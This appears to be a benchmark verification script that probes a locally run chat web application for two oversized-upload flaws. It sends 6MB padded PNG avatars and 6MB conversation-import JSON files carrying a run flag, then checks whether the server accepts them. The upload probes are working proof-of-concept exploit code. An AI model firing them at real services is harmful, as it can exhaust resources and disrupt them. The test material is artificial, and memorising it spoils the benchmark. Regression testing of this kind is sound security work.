#!/usr/bin/env bash
# verify.sh --seed|--residual
# seed     CVE-2024-11171: POST /api/files/images/avatar 6MB PNG.
#          V0 0.7.5 unlimited multer -> 200 {url}; V1 0.7.6 filterFile 2MB -> reject.
# residual CVE-2026-54024: POST /api/convos/import 6MB JSON (inline).
#          V1 still unlimited multer -> 201 + convo list contains the flag.
# Probe embeds RUN_FLAG; judge uses RUN_FLAG_REF so wrong/stale overrides fail.
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
JUDGE="${RUN_FLAG_REF:-$RUN_FLAG}"
mkdir -p "$WORK_DIR"

SVC="$VERSION"
PORT=""
for _ in $(seq 1 40); do
  PORT="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" \
    port "$SVC" 3080 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
  if [[ -n "$PORT" ]]; then
    code="$(curl -s -o /dev/null -w '%{http_code}' --max-time 5 "http://127.0.0.1:${PORT}/" || true)"
    if [[ "$code" =~ ^[1-5][0-9][0-9]$ ]]; then
      break
    fi
  fi
  sleep 2
  PORT=""
done
[[ -n "$PORT" ]] || { echo "verify: no published $SVC:3080" >&2; exit 20; }
BASE="http://127.0.0.1:${PORT}"

"$PY" - "$BASE" "$MODE" "$VERSION" "$RUN_FLAG" "$JUDGE" <<'PYEOF'
import hashlib
import json
import struct
import sys
import time
import urllib.error
import urllib.request
import uuid
import zlib

BASE, MODE, VERSION, FLAG, JUDGE = sys.argv[1:6]
BROWSER_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
)
PASS = "PcbPass123!"
AVATAR_BYTES = 6 * 1024 * 1024
IMPORT_BYTES = 6 * 1024 * 1024


def http(method, url, data=None, headers=None, timeout=180):
    req = urllib.request.Request(url, data=data, method=method, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:
        return -1, str(e).encode()


def json_headers(extra=None):
    h = {"Content-Type": "application/json", "Accept": "application/json", "User-Agent": BROWSER_UA}
    if extra:
        h.update(extra)
    return h


def multipart(files, fields=None):
    boundary = "----pcb" + uuid.uuid4().hex
    chunks = []
    for name, value in (fields or []):
        chunks.append(
            f"--{boundary}\r\nContent-Disposition: form-data; name=\"{name}\"\r\n\r\n{value}\r\n".encode()
        )
    for name, filename, blob, ctype in files:
        chunks.append(
            (
                f"--{boundary}\r\nContent-Disposition: form-data; name=\"{name}\"; "
                f"filename=\"{filename}\"\r\nContent-Type: {ctype}\r\n\r\n"
            ).encode()
            + blob
            + b"\r\n"
        )
    chunks.append(f"--{boundary}--\r\n".encode())
    return b"".join(chunks), boundary


def chunk(tag, data):
    c = struct.pack(">I", len(data)) + tag + data
    return c + struct.pack(">I", zlib.crc32(tag + data) & 0xFFFFFFFF)


def make_png(target, flag):
    ihdr = struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0)
    idat = zlib.compress(b"\x00\xff\x00\x00", 9)
    key = b"Comment"
    payload = key + b"\x00" + flag.encode("utf-8", "replace") + b"\n"
    base = 8 + 12 + len(ihdr) + 12 + len(idat) + 12 + len(payload) + 12
    pad = max(0, target - base)
    payload += b"X" * pad
    return (
        b"\x89PNG\r\n\x1a\n"
        + chunk(b"IHDR", ihdr)
        + chunk(b"IDAT", idat)
        + chunk(b"tEXt", payload)
        + chunk(b"IEND", b"")
    )


def make_import(target, flag):
    cid = str(uuid.uuid4())
    mid = str(uuid.uuid4())
    msg = {
        "messageId": mid,
        "conversationId": cid,
        "createdAt": "2024-05-29T00:33:03.661Z",
        "endpoint": "azureOpenAI",
        "error": False,
        "isCreatedByUser": True,
        "isEdited": False,
        "model": None,
        "parentMessageId": None,
        "sender": "user",
        "text": "pad",
        "unfinished": False,
        "updatedAt": "2024-05-29T00:33:03.661Z",
    }
    data = {
        "conversationId": cid,
        "endpoint": "azureOpenAI",
        "title": flag,
        "exportAt": "20:33:31 GMT-0400 (Eastern Daylight Time)",
        "branches": False,
        "recursive": False,
        "messages": [msg],
    }
    blob = json.dumps(data)
    extra = target - len(blob.encode())
    if extra > 0:
        msg["text"] = flag + "\n" + ("A" * extra)
        blob = json.dumps(data)
    return blob.encode(), cid


def ensure_user():
    slug = hashlib.sha256(FLAG.encode()).hexdigest()[:12]
    email = f"u{slug}@pcb.local"
    name = f"pcb_{FLAG}"
    st, body = -1, b""
    for i in range(12):
        http(
            "POST",
            f"{BASE}/api/auth/register",
            data=json.dumps({
                "name": name,
                "email": email,
                "password": PASS,
                "confirm_password": PASS,
            }).encode(),
            headers=json_headers(),
            timeout=20,
        )
        st, body = http(
            "POST",
            f"{BASE}/api/auth/login",
            data=json.dumps({"email": email, "password": PASS}).encode(),
            headers=json_headers(),
            timeout=20,
        )
        try:
            tok = json.loads(body).get("token")
        except Exception:
            tok = None
        if tok:
            return tok, name, email
        if st == 429:
            time.sleep(20 + i * 10)
            continue
        time.sleep(3)
    print(f"verify: login failed status={st} body={body[:240]!r}", file=sys.stderr)
    sys.exit(20)


token, uname, email = ensure_user()
auth = {"Authorization": f"Bearer {token}", "User-Agent": BROWSER_UA, "Accept": "application/json"}

if MODE == "--seed":
    field = "input" if VERSION == "v0" else "file"
    png = make_png(AVATAR_BYTES, FLAG)
    body, boundary = multipart([(field, f"{FLAG}.png", png, "image/png")])
    st, raw = http(
        "POST",
        f"{BASE}/api/files/images/avatar",
        data=body,
        headers={**auth, "Content-Type": f"multipart/form-data; boundary={boundary}"},
        timeout=180,
    )
    text = raw.decode("utf-8", "replace") if isinstance(raw, (bytes, bytearray)) else str(raw)
    print(f"verify: seed_status={st} field={field} body={text[:240].replace(chr(10), ' ')}")
    accepted = st == 200 and '"url"' in text
    if not accepted:
        sys.exit(10)
    ust, uraw = http("GET", f"{BASE}/api/user", headers=auth, timeout=20)
    utext = uraw.decode("utf-8", "replace") if isinstance(uraw, (bytes, bytearray)) else str(uraw)
    lst, lraw = http(
        "POST",
        f"{BASE}/api/auth/login",
        data=json.dumps({"email": email, "password": PASS}).encode(),
        headers=json_headers(),
        timeout=20,
    )
    ltext = lraw.decode("utf-8", "replace") if isinstance(lraw, (bytes, bytearray)) else str(lraw)
    print(f"verify: user_status={ust} login_status={lst} user={utext[:180].replace(chr(10), ' ')}")
    channel = text + "\n" + utext + "\n" + ltext + "\n" + uname
    sys.exit(0 if JUDGE and JUDGE in channel else 10)

# residual: CVE-2026-54024 — /api/convos/import still unlimited on 0.7.6
blob, cid = make_import(IMPORT_BYTES, FLAG)
body, boundary = multipart([("file", f"{FLAG}.json", blob, "application/json")])
st, raw = http(
    "POST",
    f"{BASE}/api/convos/import",
    data=body,
    headers={**auth, "Content-Type": f"multipart/form-data; boundary={boundary}"},
    timeout=180,
)
text = raw.decode("utf-8", "replace") if isinstance(raw, (bytes, bytearray)) else str(raw)
print(f"verify: import_status={st} body={text[:240].replace(chr(10), ' ')}")
if st != 201:
    sys.exit(10)
cst, craw = http("GET", f"{BASE}/api/convos", headers=auth, timeout=30)
ctext = craw.decode("utf-8", "replace") if isinstance(craw, (bytes, bytearray)) else str(craw)
print(f"verify: convos_status={cst} body={ctext[:300].replace(chr(10), ' ')}")
channel = text + "\n" + ctext
if JUDGE and JUDGE in channel:
    sys.exit(0)
# fallback: pull messages for imported ids
try:
    payload = json.loads(craw)
    convos = payload.get("conversations") or payload.get("data") or []
    if isinstance(payload, list):
        convos = payload
except Exception:
    convos = []
for c in convos[:8]:
    cid2 = c.get("conversationId") or c.get("id")
    if not cid2:
        continue
    mst, mraw = http("GET", f"{BASE}/api/messages/{cid2}", headers=auth, timeout=30)
    mtext = mraw.decode("utf-8", "replace") if isinstance(mraw, (bytes, bytearray)) else str(mraw)
    channel += "\n" + mtext
    if JUDGE and JUDGE in mtext:
        print(f"verify: messages_status={mst} hit")
        sys.exit(0)
print("verify: residual flag not in convos/messages")
sys.exit(10)
PYEOF
